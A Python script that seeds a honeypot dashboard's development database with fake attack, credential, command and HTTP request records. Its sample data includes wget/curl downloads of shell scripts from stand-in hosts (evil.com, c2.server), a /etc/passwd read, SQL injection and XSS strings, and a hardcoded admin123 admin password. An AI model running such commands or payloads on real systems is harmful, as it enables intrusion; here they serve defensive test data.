#!/usr/bin/env python3
"""
Database Seeding Script

Populate database with test data for development.
"""

import asyncio
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.config import load_config
from core.database import (
    Attack,
    Alert,
    Command,
    Credential,
    HttpRequest,
    User,
    init_database,
    get_session,
)
from api.auth import hash_password


ATTACK_TYPES = [
    "reconnaissance", "brute_force", "sql_injection",
    "xss", "rce", "path_traversal", "credential_theft",
]

SERVICES = ["ssh", "http", "ftp"]

COUNTRIES = [
    ("US", "United States", 37.0902, -95.7129),
    ("CN", "China", 35.8617, 104.1954),
    ("RU", "Russia", 61.5240, 105.3188),
    ("DE", "Germany", 51.1657, 10.4515),
    ("BR", "Brazil", -14.2350, -51.9253),
    ("IN", "India", 20.5937, 78.9629),
    ("GB", "United Kingdom", 55.3781, -3.4360),
    ("FR", "France", 46.2276, 2.2137),
]

USERNAMES = ["root", "admin", "user", "test", "guest", "oracle", "postgres", "mysql"]
PASSWORDS = ["password", "123456", "admin", "root", "test", "password123", "qwerty"]


async def seed_users():
    """Create default admin user."""
    async with get_session() as session:
        admin = User(
            username="admin",
            email="admin@honeytrap.local",
            hashed_password=hash_password("admin123"),
            is_admin=True,
        )
        session.add(admin)
        print("Created admin user (admin / admin123)")


async def seed_attacks(count: int = 500):
    """Generate fake attack records."""
    print(f"Generating {count} attack records...")

    async with get_session() as session:
        for i in range(count):
            country = random.choice(COUNTRIES)
            service = random.choice(SERVICES)
            attack_type = random.choice(ATTACK_TYPES)

            attack = Attack(
                timestamp=datetime.utcnow() - timedelta(
                    days=random.randint(0, 30),
                    hours=random.randint(0, 23),
                    minutes=random.randint(0, 59),
                ),
                source_ip=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                source_port=random.randint(1024, 65535),
                destination_port={"ssh": 22, "http": 80, "ftp": 21}.get(service, 80),
                protocol="TCP",
                service_type=service,
                attack_type=attack_type,
                severity=random.randint(1, 10),
                country_code=country[0],
                country_name=country[1],
                latitude=country[2] + random.uniform(-5, 5),
                longitude=country[3] + random.uniform(-5, 5),
            )
            session.add(attack)

            if i % 100 == 0:
                await session.flush()
                print(f"  Created {i + 1} attacks...")

        await session.flush()

    print(f"Created {count} attack records")


async def seed_credentials(attack_ids: list[int]):
    """Generate fake credential attempts."""
    print("Generating credential records...")

    async with get_session() as session:
        for attack_id in random.sample(attack_ids, min(200, len(attack_ids))):
            for _ in range(random.randint(1, 5)):
                cred = Credential(
                    attack_id=attack_id,
                    username=random.choice(USERNAMES),
                    password=random.choice(PASSWORDS),
                    auth_method="password",
                    success=random.random() < 0.1,
                )
                session.add(cred)


async def seed_commands(attack_ids: list[int]):
    """Generate fake command records."""
    print("Generating command records...")

    commands = [
        ("ls", "-la", "recon"),
        ("cat", "/etc/passwd", "recon"),
        ("wget", "http://evil.com/shell.sh", "download"),
        ("curl", "http://c2.server/payload", "download"),
        ("chmod", "+x /tmp/shell.sh", "persistence"),
        ("whoami", "", "recon"),
        ("id", "", "recon"),
        ("uname", "-a", "recon"),
    ]

    async with get_session() as session:
        for attack_id in random.sample(attack_ids, min(100, len(attack_ids))):
            for _ in range(random.randint(1, 10)):
                cmd = random.choice(commands)
                command = Command(
                    attack_id=attack_id,
                    command=cmd[0],
                    arguments=cmd[1],
                    command_type=cmd[2],
                    is_malicious=cmd[2] in ("download", "persistence"),
                )
                session.add(command)


async def seed_http_requests(attack_ids: list[int]):
    """Generate fake HTTP request records."""
    print("Generating HTTP request records...")

    paths = [
        ("/admin/login", "POST", True, False),
        ("/wp-login.php", "POST", False, False),
        ("/.env", "GET", False, False),
        ("/api/users?id=1' OR 1=1--", "GET", True, False),
        ("/search?q=<script>alert(1)</script>", "GET", False, True),
        ("/phpmyadmin/", "GET", False, False),
    ]

    async with get_session() as session:
        for attack_id in random.sample(attack_ids, min(150, len(attack_ids))):
            path_info = random.choice(paths)
            request = HttpRequest(
                attack_id=attack_id,
                method=path_info[1],
                path=path_info[0],
                user_agent="Mozilla/5.0 (compatible; bot)",
                response_status=random.choice([200, 401, 403, 404]),
                contains_sql_injection=path_info[2],
                contains_xss=path_info[3],
            )
            session.add(request)


async def main():
    print("HoneyTrap Database Seeder")
    print("=" * 40)

    config = load_config()
    await init_database(config.database.url)

    await seed_users()
    await seed_attacks(500)

    async with get_session() as session:
        from sqlalchemy import select
        result = await session.execute(select(Attack.id))
        attack_ids = [row[0] for row in result.all()]

    await seed_credentials(attack_ids)
    await seed_commands(attack_ids)
    await seed_http_requests(attack_ids)

    print("\nSeeding complete!")
    print("You can now login with: admin / admin123")


if __name__ == "__main__":
    asyncio.run(main())
